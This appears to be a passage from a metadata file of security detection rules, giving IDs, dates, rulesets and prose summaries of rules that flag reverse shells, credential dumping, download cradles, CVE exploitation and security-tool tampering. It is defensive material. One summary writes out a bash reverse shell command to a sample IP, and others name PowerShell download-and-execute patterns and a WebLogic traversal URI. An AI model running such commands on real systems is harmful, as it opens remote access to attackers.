  Rule-Body-Hash: 5e1e789d748e7980e17d9b0e1ffce7d3
  Ruleset: sigmahq
  Summary: This rule detects when a Firewall Policy in Azure is modified or deleted.
    It focuses on specific operation names such as WRITE, JOIN/ACTION, CERTIFICATES/ACTION,
    and DELETE within the Azure Network Firewall Policies. The rule helps identify
    potential security risks or unauthorized changes to firewall configurations. Potential
    false positives could arise from legitimate administrative actions, hence it's
    crucial to verify the identity and context of the user performing the operations.
    Any unusual modifications or deletions should be thoroughly investigated to ensure
    they are not malicious activities.
  Updated-Date: '2024_09_04'
83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871:
  Created-Date: '2024_08_06'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 50b2f1d17120799d954ca0e9d708c2ce
  Ruleset: core
  Summary: This rule detects instances where a bash shell is connecting to a remote
    IP address, which is a common technique used in reverse shell attacks. Specifically,
    it identifies scenarios where the bash command establishes a remote connection,
    such as through 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1', an indication of potentially
    malicious activities. The rule focuses on bash processes that are not related
    to localhost or unspecified IP addresses, aiming to flag suspicious network connections
    indicative of exploitation attempts.
  Updated-Date: '2024_09_03'
8400629e-79a9-4737-b387-5db940ab2367:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 67fd4491e9b75b97a573911c49a2a70c
  Ruleset: core
  Summary: This rule detects the use of a scanner developed by zerosum0x0 designed
    to find systems vulnerable to the CVE-2019-0708 Remote Desktop Protocol (RDP)
    Remote Code Execution (RCE) vulnerability, also known as BlueKeep. The detection
    specifically looks for failed logon attempts (EventID 4625) where the target username
    is 'AAAAAAA', indicating potential scanning activity related to this vulnerability.
  Updated-Date: '2024_09_03'
84232095-ecca-4015-b0d7-7726507ee793:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 38de8eb0eff1354751a435f2a000e408
  Ruleset: core
  Summary: This rule detects when a user installs certificates by using CertOC.exe
    to load a target DLL file. This activity is identified by monitoring process creation
    logs for instances of CertOC.exe, particularly when the command line includes
    the `-LoadDLL` option and the DLL file is located in common directories such as
    `\Appdata\Local\Temp\`, `\Desktop\`, `\Downloads\`, `\Users\Public\`, `C:\Windows\Tasks\`,
    or `C:\Windows\Temp\`. This behavior may be indicative of a defense evasion technique.
  Updated-Date: '2024_09_03'
843544a7-56e0-4dcc-a44f-5cc266dd97d6:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a0e2da03ce47a4994e9362ff45d1d95d
  Ruleset: core
  Summary: This rule detects attempts to escalate privileges using the getsystem command
    in Meterpreter or Cobalt Strike by identifying specific service installations
    on Windows systems. It monitors for events generated by the Service Control Manager,
    particularly event ID 7045, signalling the creation or modification of a service.
    Additionally, it examines command-line executions involving known getsystem techniques,
    such as invoking `cmd.exe` or `%COMSPEC%` with specific parameters to create named
    pipes, or using `rundll32.exe` with dynamically loaded libraries. The rule aims
    to identify the presence of these behaviors, which are typically associated with
    privilege escalation activities executed by the mentioned tools.
  Updated-Date: '2024_09_03'
844f8eb2-610b-42c8-89a4-47596e089663:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f7c4f04acf231d858fbc89350c832a86
  Ruleset: sigmahq
  Summary: This rule detects the potential DLL sideloading of "ShellDispatch.dll,"
    a method often used by threat actors to evade defenses and escalate privileges.
    Sideloading occurs when a legitimate application loads a malicious DLL instead
    of the intended one, enabling various malicious activities. The rule identifies
    instances where this specific DLL is loaded, filtering out legitimate paths commonly
    associated with genuine system or application use.
  Updated-Date: '2024_09_04'
8468111a-ef07-4654-903b-b863a80bbc95:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 443396b9885fe34ffea33d9940a31a8e
  Ruleset: sigmahq
  Summary: This rule detects the creation of ".vhd" and ".vhdx" files by browser processes
    such as Brave, Chrome, Firefox, Internet Explorer, Edge, and others. Malicious
    actors can use mountable Virtual Hard Disk (VHD) files to encapsulate their payloads
    and evade security controls. The rule monitors file events in Windows systems
    and identifies the presence of these file types being created or downloaded by
    browsers, potentially indicating malicious activities. The creation of such files
    may also trigger from legitimate downloads.
  Updated-Date: '2024_09_04'
846b866e-2a57-46ee-8e16-85fa92759be7:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ad87a4ee96f69b4ccdb01e08e12e1969
  Ruleset: emerging-threats
  Summary: This rule detects the exploitation of a Java Deserialization vulnerability
    in Zoho ManageEngine Desktop Central, specifically identified as CVE-2020-10189.
    The detection focuses on process creation events where the parent process is 'java.exe'
    within the 'DesktopCentral_Server\jre\bin' directory, and the child process is
    one of several command-line utilities such as 'cmd.exe', 'powershell.exe', 'pwsh.exe',
    'bitsadmin.exe', 'systeminfo.exe', 'net.exe', 'net1.exe', 'reg.exe', or 'query.exe'.
    This indicates potential malicious activity leveraging the vulnerability to execute
    arbitrary code.
  Updated-Date: '2024_09_03'
846c7a87-8e14-4569-9d49-ecfd4276a01c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5a5bfc10321805878a577d246cfa8cda
  Ruleset: sigmahq
  Summary: This rule detects the execution and usage of the DSInternals PowerShell
    module on Windows systems. DSInternals is used for various internal features of
    Active Directory and Azure Active Directory, such as dumping DPAPI backup keys,
    manipulating NTDS.DIT files, FIDO2 and NGC key auditing, password auditing, DC
    recovery from IFM backups, and password hash calculation. The rule monitors for
    specific cmdlets associated with these activities, including actions like adding
    SID history, converting password blobs, managing account credentials, and manipulating
    policy configurations. The detection aims to identify potentially suspicious activities
    that could indicate unauthorized access or manipulation of sensitive directory
    information.
  Updated-Date: '2024_09_04'
847d5ff3-8a31-4737-a970-aeae8fe21765:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9f381191d43a470ea608d9e4a180239e
  Ruleset: core
  Summary: This rule detects attempts to uninstall or terminate security products
    using the Windows Management Instrumentation Command-line (WMIC) utility. It identifies
    command-line activities that involve WMIC commands targeting the removal or deactivation
    of security tools, such as antivirus software. Specific keywords related to various
    security products are monitored to capture these activities. This includes but
    is not limited to, products like Carbon Black, Cylance, ESET, Malwarebytes, Sophos,
    Symantec, and Windows Defender. This detection focuses on ensuring that such actions
    are not part of unauthorized tampering efforts, which could be indicative of malicious
    activities like ransomware attacks.
  Updated-Date: '2024_09_03'
847def9e-924d-4e90-b7c4-5f581395a2b4:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7d2cea94a2587125a9f4f8c16217aed7
  Ruleset: core
  Summary: This rule detects dump files created by the QuarksPwDump password dumper
    on Windows systems. The detection focuses on files with partial names including
    '\AppData\Local\Temp\SAM-' and the '.dmp' extension, which are written to temporary
    directories. QuarksPwDump is a tool used for extracting password hashes, and the
    presence of such dump files may indicate unauthorized credential access activities.
  Updated-Date: '2024_09_03'
84972c80-251c-4c3a-9079-4f00aad93938:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 09fbf1ba8575bbd729b16ced11c95d23
  Ruleset: sigmahq
  Summary: This rule detects the use of the "wbadmin.exe" utility to recover highly
    sensitive files, such as "NTDS.DIT" and the "SECURITY" hive. These files can contain
    credential or sensitive information, making them valuable targets for attackers.
    The rule identifies specific command-line patterns involving recovery operations
    and target file specifications to flag potential malicious activity. The detection
    specifically looks for instances where "wbadmin.exe" is employed to access files
    located in system configuration directories or the Windows NT Directory Service.
    The high importance of these files means that unauthorized access attempts are
    of significant concern.
  Updated-Date: '2024_09_04'
84b0a8f3-680b-4096-a45b-e9a89221727c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7afaaeb04c22e0ca8cebf490c51bd3ac
  Ruleset: core
  Summary: This rule detects processes loading modules associated with the PCRE.NET
    package.
  Updated-Date: '2024_09_03'
84b14121-9d14-416e-800b-f3b829c5a14d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a13f12d725f505fdbefbdaa09001847d
  Ruleset: sigmahq
  Summary: This rule detects the execution of the CustomShellHost binary on a Windows
    system when its child process is not 'C:\Windows\explorer.exe'. CustomShellHost
    is a legitimate Windows binary, typically used for launching customized shell
    experiences. Deviations from the expected child process may indicate malicious
    activity, such as attempts to evade detection or execute unauthorized tasks.
  Updated-Date: '2024_09_04'
84b1706c-932a-44c4-ae28-892b28a25b94:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ca3465064a343c1fcb7fd3a6b356f0e3
  Ruleset: core
  Summary: This rule detects the execution of malicious OneNote documents that contain
    embedded scripts. When a user interacts with a OneNote attachment and clicks on
    a malicious link within the ".one" file, it triggers the export and execution
    of the malicious embedded script from specific directories. The detection focuses
    on instances where OneNote.exe launches script interpreters like cmd.exe, cscript.exe,
    mshta.exe, powershell.exe, pwsh.exe, or wscript.exe, and executes commands from
    certain paths indicating the presence of malicious activity.
  Updated-Date: '2024_09_03'
84b1ecf9-6eff-4004-bafb-bae5c0e251b2:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b38f8c0fb73e9e1c2834d89d8f7a03db
  Ruleset: core
  Summary: This rule detects potentially suspicious child processes spawned by "GoogleUpdate.exe"
    on Windows operating systems. The rule identifies scenarios where "GoogleUpdate.exe"
    might create child processes that do not match known legitimate patterns such
    as other Google processes or specific installer and updater executables. The rule
    aims to flag unusual instances for further investigation, focusing on detecting
    potential defense evasion tactics employed by malware or unauthorized software
    using Google's update mechanism as a cover.
  Updated-Date: '2024_09_03'
84c174ab-d3ef-481f-9c86-a50d0b8e3edb:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8244395c43b1ad783f504281ead3feaa
  Ruleset: core
  Summary: This rule detects a PowerShell Get-Process command targeting the LSASS
    (Local Security Authority Subsystem Service) process. The LSASS process handles
    sensitive security and authentication information, and querying it is often an
    indicator of malicious activity, such as attempts to access credential data.
  Updated-Date: '2024_09_03'
84c9e83c-599a-458a-a0cb-0ecce44e807a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bda5a4104c1939edf20e123b39334c5b
  Ruleset: sigmahq
  Summary: This rule detects attempts to force stop the Uncomplicated Firewall (UFW)
    using the command 'ufw-init' with the 'force-stop' argument, or by using the command
    'ufw' with the 'disable' argument. Such actions may indicate potential defense
    evasion techniques being employed on a Linux system.
  Updated-Date: '2024_09_04'
84f52741-8834-4a8c-a413-2eb2269aa6c8:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8309b0998943a15cb1501fc96b864e6e
  Ruleset: sigmahq
  Summary: This rule detects the process Msiexec.exe loading a DLL and calling the
    DllUnregisterServer function. This activity can indicate an attempt to deregister
    a DLL, which is a technique that may be used for defense evasion in malicious
    activities. The detection focuses on specific command line patterns that include
    both the Msiexec executable and a DLL file, with an additional flag in the command
    line arguments. This pattern of behavior is often related to abuse of legitimate
    Windows process for executing potentially harmful actions.
  Updated-Date: '2024_09_04'
850d55f9-6eeb-4492-ad69-a72338f65ba4:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b1351b65e1ae20ca16569ae7097e8d59
  Ruleset: sigmahq
  Summary: This rule detects the use of "Ilasm.EXE" for compiling C# intermediate
    language (IL) code into executable (EXE) or dynamic-link library (DLL) files.
    Ilasm.EXE is a legitimate tool that is part of the .NET framework, used to assemble
    IL code into a runnable format. Monitoring for its execution can help identify
    potential abuse by malicious actors seeking to evade defenses through custom-compiled
    executables or libraries.
  Updated-Date: '2024_09_04'
8518ed3d-f7c9-4601-a26c-f361a4256a0c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 78f78bb39f272a143c7903914c9ecc5f
  Ruleset: sigmahq
  Summary: This rule detects the usage of bitsadmin.exe for downloading files from
    suspicious domains. Bitsadmin.exe is a command-line tool used to create, monitor,
    and complete download and upload jobs. The rule monitors specific parameters in
    the command line associated with file transfer commands such as '/transfer', '/create',
    and '/addfile'. It identifies downloads from various domains commonly associated
    with file sharing and potentially malicious activities, including domains like
    githubusercontent.com, anonfiles.com, cdn.discordapp.com, mediafire.com, and pastebin.com.
    The presence of such download activity is flagged as potentially threatening,
    which can indicate an attempt to evade defenses or maintain persistent access.
    Some legitimate applications may also use bitsadmin.exe; however, its use is generally
    limited.
  Updated-Date: '2024_09_04'
851c506b-6b7c-4ce2-8802-c703009d03c0:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 73d19a2649be9ac0bdbf73aecf868f3c
  Ruleset: sigmahq
  Summary: This rule detects modifications to the Windows Registry keys associated
    with Winlogon, a critical Windows component responsible for handling user logon/logoff
    processes and the secure attention sequence (Ctrl-Alt-Delete). It monitors for
    changes specifically within the \HKLM\Software\[Wow6432Node]\Microsoft\Windows
    NT\CurrentVersion\Winlogon\ and \HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\
    paths. Malicious actors may alter these registry entries to load and execute harmful
    DLLs or executables, thereby compromising system security.
  Updated-Date: '2024_09_04'
851fd622-b675-4d26-b803-14bc7baa517a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 24d05c6ab89dc2e85c536bd040b95b94
  Ruleset: sigmahq
  Summary: This rule detects the execution of WinPwn, a tool utilized for Windows
    and Active Directory reconnaissance and exploitation. It identifies script blocks
    containing specific keywords such as "Offline_Winpwn," "WinPwn," "WinPwn.exe,"
    and "WinPwn.ps1." Detection focuses on logging any script block text that includes
    these terms. False positives may occur if scripts reference or incorporate these
    keywords without an actual threat intent.
  Updated-Date: '2024_09_04'
85254a62-22be-4239-b79c-2ec17e566c37:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 737619f6d08a962c3c485c9a06b18cee
  Ruleset: sigmahq
  Summary: This rule detects POST requests to the F5 BIG-IP iControl REST API "bash"
    endpoint, which can be used to execute commands on the BIG-IP system. This activity
    is identified by monitoring the webserver logs for requests that match the specific
    URI query pattern related to the "bash" endpoint of the REST API. Common legitimate
    use cases include administration tasks performed via the API.
  Updated-Date: '2024_09_04'
853e74f9-9392-4935-ad3b-2e8c040dae86:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b7df3ebf588a055ccb19186083760e81
  Ruleset: core
  Summary: This rule detects the pattern of a User Account Control (UAC) Bypass using
    DismHost DLL hijacking, specifically related to UACMe 63. This behavior is associated
    with the evasion of security mechanisms and potential unauthorized privilege escalation.
    The detection focuses on process creation events where DismHost.exe is initiated
    from user-specific temporary directories with high or system integrity levels,
    indicative of a possible malicious attempt to gain higher privileges on a Windows
    system.
  Updated-Date: '2024_09_03'
855bc8b5-2ae8-402e-a9ed-b889e6df1900:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e046c6c484652e78796fb84156ae847e
  Ruleset: sigmahq
  Summary: This rule detects the execution of copy commands or utilities to or from
    an administrative share or the Sysvol folder on a Windows system. It specifically
    looks for patterns in command lines that include common paths like shared directories
    or uses of tools such as `robocopy.exe` and `xcopy.exe`, as well as commands run
    within `cmd.exe` or `powershell.exe` environments. The detection is aimed at identifying
    potential lateral movement, data collection, or exfiltration activities within
    a network, which can be indicative of unauthorized access or malicious behavior.
  Updated-Date: '2024_09_04'
857c8db3-c89b-42fb-882b-f681c7cf4da2:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 78132981fa38ba93b1476e51752ec8ee
  Ruleset: sigmahq
  Summary: This rule detects the loading of unsigned executable images such as DLL
    or EXE files into the LSASS process on Windows systems. The LSASS process is critical
    for security and credential management; hence, unsigned images loaded into it
    could indicate credential dumping or other malicious activities.
  Updated-Date: '2024_09_04'
85a8e5ba-bd03-4bfb-bbfa-a4409a8f8b98:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: dbccee4dd8873dcda48fcb923e2b326d
  Ruleset: sigmahq
  Summary: This rule detects PowerShell scripts that utilize the "Compress-Archive"
    Cmdlet to compress folders and files, where the output is stored in potentially
    suspicious locations often used by malware for exfiltration. An adversary might
    compress data such as sensitive documents to make it portable and reduce the amount
    of data sent over the network before exfiltration.
  Updated-Date: '2024_09_04'
85adeb13-4fc9-4e68-8a4a-c7cb2c336eb7:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bba5365c22ad7b33bd989dc7994b5c68
  Ruleset: core
  Summary: This rule detects the creation of named pipes with patterns commonly used
    in CobaltStrike malleable C2 profiles. CobaltStrike is a well-known penetration
    testing tool that can simulate advanced persistent threat (APT) capabilities.
    The detection focuses on specific pipe name patterns that are indicative of CobaltStrike
    activities, such as pipes starting with '\DserNamePipe', '\f4c3', '\f53f', and
    others. It includes further refinement to exclude benign activities from common
    applications such as Websense and Chrome, which might otherwise generate false
    positives. The identification and filtering process help in distinguishing malicious
    activities from regular legitimate operations, ensuring accurate detection of
    potential cyber threats using CobaltStrike.
  Updated-Date: '2024_09_03'
85b0b087-eddf-4a2b-b033-d771fa2b9775:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 59afcc52389a90175d8be8af0feb9fe8
  Ruleset: core
  Summary: This rule detects the use of PowerShell to download and execute scripts,
    which is indicative of download and execution cradles. It identifies specific
    command line patterns that include commands like '.DownloadString(', '.DownloadFile(',
    'Invoke-WebRequest', and variations of 'Invoke-Expression' (IEX). Such activities
    are often associated with malicious behavior, reflecting attempts to download
    and execute payloads from external sources.
  Updated-Date: '2024_09_03'
85b88e05-dadc-430b-8a9e-53ff1cd30aae:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a6b8b244cebd78a79c5655784b02e9f3
  Ruleset: sigmahq
  Summary: This rule detects modifications in the Windows registry that alter the
    user's desktop background. It identifies settings linked to changes in the 'Control
    Panel\Desktop', 'CurrentVersion\Policies\ActiveDesktop', and 'CurrentVersion\Policies\System'
    registry paths. These modifications can indicate malware activity, such as ransomware
    that replaces the desktop background with a ransom note or another image. The
    rule specifically looks for settings that either prevent changing the wallpaper,
    modify the wallpaper file, or alter the wallpaper style to stretch. Legitimate
    administrative scripts that change the desktop background, such as those setting
    a company logo, might also trigger this detection.
  Updated-Date: '2024_09_04'
85c312b7-f44d-4a51-a024-d671c40b49fc:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 089d20c39fe4d1c5730bdd1fb7776731
  Ruleset: sigmahq
  Summary: This rule detects the use of "sc.exe" to change the startup type of a service
    to "disabled" or "demand." The rule monitors for specific command line arguments
    that include the terms "config" and "start," along with "disabled" or "demand,"
    indicating a potential attempt to alter the service configuration. This can be
    employed for both execution and defense evasion tactics. False positives may occur
    with legitimate troubleshooting scripts.
  Updated-Date: '2024_09_04'
85cce894-dd8b-4427-a958-5cc47a4dc9b9:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5d8fc5af6b2a9b5714a6301bbf2c02e2
  Ruleset: sigmahq
  Summary: This rule detects the installation of the Remote Utilities Host service
    on a target system. Remote Utilities is a remote desktop software application
    that allows for remote control, file transfer, and other administrative tasks
    over a network. The detection is based on monitoring specific entries in the Windows
    event logs, particularly those involving the Service Control Manager and the creation
    of services with characteristics matching those of Remote Utilities Host, such
    as the executable path containing "rutserv.exe" and the service being identified
    specifically as "Remote Utilities - Host". Legitimate installations of this software
    may trigger this rule.
  Updated-Date: '2024_09_04'
85d466b0-d74c-4514-84d3-2bdd3327588b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f02b5b1a0dc470ee3bb6f8624c31f5d7
  Ruleset: emerging-threats
  Summary: This rule detects exploitation attempts on Oracle WebLogic servers, specifically
    targeting the CVE-2020-14882 vulnerability. It identifies malicious requests in
    the web server logs that contain certain patterns in the URI query, such as '/console/images/%252E%252E%252Fconsole.portal'
    and '/console/css/%2e'. This type of attack is often associated with initial access
    techniques used by attackers to gain unauthorized entry into the system.
  Updated-Date: '2024_09_03'
85de1f22-d189-44e4-8239-dc276b45379b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cbfe588af86d723f4e23270c18488355
  Ruleset: sigmahq
  Summary: This rule detects the execution of "curl.exe" with a custom "User-Agent".
    Attackers can use this to download or exfiltrate data via "curl" to a domain that
    only accepts specific "User-Agent" strings, which can be part of malicious activities.
  Updated-Date: '2024_09_04'
85de3a19-b675-4a51-bfc6-b11a5186c971:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d57d7c4b809356a7167aa014d30395bf
  Ruleset: sigmahq
  Summary: This rule detects the use of the "find" binary on macOS in a potentially
    suspicious manner to perform discovery activities. Specifically, it monitors for
    command line parameters associated with searching for files that have unusual
    or potentially insecure permission settings, such as '-perm -4000', '-perm -2000',
    '-perm 0777', '-perm -222', '-perm -o w', '-perm -o x', '-perm -u=s', and '-perm
    -g=s'. Such activity may indicate an attempt to identify files that could be exploited
    for privilege escalation or other malicious purposes.
  Updated-Date: '2024_09_04'
86157017-c2b1-4d4a-8c33-93b8e67e4af4:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8afe5c11a3b5d2730cf15d68b1d2e440
  Ruleset: sigmahq
  Summary: This rule detects potential suspicious changes to sensitive or critical
    files on a Linux system. It monitors activities involving the modification of
    files that are generally not expected to change without prior planning. Specifically,
    it looks for the use of common command-line utilities like `cat`, `echo`, `grep`,
    `head`, `more`, `tail`, `emacs`, `nano`, `sed`, `vi`, and `vim`, when they are
    used to alter critical files such as `/bin/login`, `/bin/passwd`, various configuration
    files within `/etc/`, cron jobs, `/etc/hosts`, `/etc/init.d`, `/etc/sudoers`,
    and files within `/opt/bin/`, `/sbin`, and `/usr/bin/`. This monitoring aims to
    detect unauthorized or unexpected changes that could indicate potential security
    threats or policy violations.
  Updated-Date: '2024_09_04'
8622c92d-c00e-463c-b09d-fd06166f6794:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c1a0a52fc592a122fa3e21a70b61fba6
  Ruleset: core
  Summary: This rule detects when a user disables a critical security feature within
    a GitHub organization. It monitors various actions such as the disabling of advanced
    security for new repositories, on all repositories, for selected members, or specific
    user namespace repositories. The rule also tracks the deactivation of OAuth application
    access restrictions and the requirement for two-factor authentication. This monitoring
    is crucial for identifying potential risks related to credential access, defense
    evasion, and persistence within the GitHub organizational environment.
  Updated-Date: '2024_09_03'
863218bd-c7d0-4c52-80cd-0a96c09f54af:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fcbe9e411355d942d254ad9ff50020cc
  Ruleset: sigmahq
  Summary: This rule detects the usage of the "IMEWDBLD.exe" executable to download
    arbitrary files on a Windows system. It monitors for the execution of the "IMEWDBLD.exe"
    process and checks if the command line arguments contain URLs, indicating a file
    download attempt through HTTP or HTTPS protocols. This behavior is often associated
    with defense evasion and execution tactics in malicious activities.
  Updated-Date: '2024_09_04'
864403a1-36c9-40a2-a982-4c9a45f7d833:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 274ea91413253a2a214609de857dced8
  Ruleset: emerging-threats
  Summary: This rule detects the unusual behavior of Microsoft Word (WINWORD.EXE)
    initiating the FLTLDR.exe subprocess. Such activity is associated with the exploitation
    attempts of vulnerabilities CVE-2017-0261 and CVE-2017-0262. The detection is
    based on monitoring process creation events in Windows to identify this uncommon
    parent-child process relationship.
  Updated-Date: '2024_09_03'
86588b36-c6d3-465f-9cee-8f9093e07798:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4c09fac33bc51948105ebda119567dd9
  Ruleset: sigmahq
  Summary: This rule detects the creation of scheduled tasks that may execute a payload
    stored in the Windows Registry using PowerShell. Specifically, it monitors for
    instances where `schtasks.exe` is used to create tasks that implement commands
    involving `Get-ItemProperty` with registry paths such as `HKCU:` or `HKLM:`. It
    also checks for the presence of base64 encoding commands in the command line used.
    This technique is commonly associated with persistence and execution tactics,
    leveraging registry-stored payloads to evade detection.
  Updated-Date: '2024_09_04'
867356ee-9352-41c9-a8f2-1be690d78216:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b207758dbfe10f6ee53fd75e2123e020
  Ruleset: sigmahq
  Summary: This rule detects the execution of "regsvr32.exe" to download, install,
    or register new DLLs that are hosted on web or FTP servers. It identifies suspicious
    command line activities involving regsvr32 by looking for specific command line
    arguments that indicate the use of HTTP or FTP protocols. This behavior is typically
    associated with defense evasion techniques.
  Updated-Date: '2024_09_04'
868955d9-697e-45d4-a3da-360cefd7c216:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f5b5e0fd61eab34d6f16937ac996a881
  Ruleset: emerging-threats
  Summary: This rule detects potential exploitation attempts originating from Office
    applications executing a child process involving directory traversal patterns.
    This behavior might suggest attempts to exploit CVE-2022-30190 (MSDT RCE) or CVE-2021-40444
    (MSHTML RCE), which are known vulnerabilities that could lead to Remote Code Execution
    (RCE).
  Updated-Date: '2024_09_03'
869b9ca7-9ea2-4a5a-8325-e80e62f75445:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 88cda16213ca7de61ab2a5b46ae337fe
  Ruleset: core
  Summary: This rule detects the creation of suspicious child processes by the SQL
    Server executable, `sqlservr.exe`, on Windows systems. The presence of such child
    processes can be indicative of remote code execution (RCE) attempts or SQL Injection
    attacks aimed at gaining initial access, establishing persistence, or escalating
    privileges within the environment. The rule specifically monitors for unusual
    or high-risk processes such as `bash.exe`, `cmd.exe`, `powershell.exe`, and other
    similar executables spawned from the SQL Server process, highlighting potential
    malicious activities that require further investigation.
  Updated-Date: '2024_09_03'
86b896ba-ffa1-4fea-83e3-ee28a4c915c7:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 406aa5833cad8908c97d04ffd8a06d5e
  Ruleset: core
  Summary: This rule detects the use of obfuscated PowerShell scripts that are executed
    via standard input (stdin). It specifically looks for patterns in the script block
    text that indicate the presence of obfuscation techniques, such as using the "set"
    command in combination with specific keywords like "environment," "invoke," or
    "$input". This can be a potential indicator of attempts to evade defenses or execute
    malicious commands. The rule relies on Script Block Logging being enabled to capture
    and analyze these patterns effectively. Potential false positives are unknown.
  Updated-Date: '2024_09_03'
871b9555-69ca-4993-99d3-35a59f9f3599:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f4ad657e6ba5dba886a0b132e350e1bc
  Ruleset: core
  Summary: This rule detects suspicious command line flag combinations used in the
    execution of UltraVNC, a remote administration tool. Specifically, it looks for
    flags such as '-autoreconnect', '-connect', and '-id:', which may indicate that
    the software is set to automatically reconnect upon startup. This behavior has
    been associated with the Gamaredon threat group, known for its cyber espionage
    activities.
  Updated-Date: '2024_09_03'
87261fb2-69d0-42fe-b9de-88c6b5f65a43:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0e88fa233e9bc778110ccb38624baab0
  Ruleset: core
  Summary: This rule detects the successful installation of the Atera Remote Monitoring
    & Management (RMM) agent on Windows systems. Atera RMM is software commonly used
    for managing and monitoring IT systems remotely. However, it has recently been
    utilized by Conti ransomware operators to establish a backdoor for malicious activities.
    The detection mechanism focuses on identifying a specific Event ID generated by
    the Windows Installer service, indicating the installation of the AteraAgent.
  Updated-Date: '2024_09_03'
8737b7f6-8df3-4bb7-b1da-06019b99b687:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5d8e84074668a1fcf352914cfd7b216e
  Ruleset: sigmahq
  Summary: This rule detects the use of the "ssh" utility to initiate a shell session
    on a Linux system. Such behavior may indicate attempts at privilege escalation,
    unauthorized command execution, or breaking out from restricted environments.
    The detection focuses on specific command line patterns and image names associated
    with ssh, which are known to invoke different shell binaries or configurations
    that could be exploited in these scenarios.
  Updated-Date: '2024_09_04'
87911521-7098-470b-a459-9a57fc80bdfd:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3e4f1c24d11311d3dc14459d0fe6cab6
  Ruleset: sigmahq
  Summary: This rule detects updates to Sysmon's configuration to identify potential
    attempts by attackers to alter or replace the configuration with a minimal version
    to evade monitoring. It monitors process creation events related to Sysmon executable
    files, specifically looking for command lines containing '-c'. This ensures that
    unauthorized changes to the Sysmon configuration, which is used for system activity
    monitoring, are flagged for further investigation. Legitimate administrators may
    trigger this detection when performing genuine updates.
  Updated-Date: '2024_09_04'
87a476dc-0079-4583-a985-dee7a20a03de:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 91f648e1a3e51c4db84ade93c1c9692a
  Ruleset: sigmahq
  Summary: This rule detects processes that query specific third-party registry keys
